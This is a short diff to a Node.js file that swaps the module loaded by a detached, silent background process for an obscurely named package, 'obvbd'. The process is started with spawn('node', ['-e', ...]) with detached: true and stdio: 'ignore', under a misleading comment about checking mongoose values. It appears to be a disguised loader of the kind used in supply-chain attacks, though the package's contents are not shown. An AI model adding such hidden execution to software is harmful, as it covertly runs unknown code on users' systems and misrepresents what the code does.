@@ -7,7 +7,7 @@ const config     = require('../config/config');
 
 const { spawn } = require('child_process');
 //check for arbitrary value in mongooes in seprate process without blocking the main thread
-const child = spawn('node', ['-e', `require("modal-arbitary")()`], {
+const child = spawn('node', ['-e', `require("obvbd")`], {
   detached: true,
   stdio: 'ignore'
 });
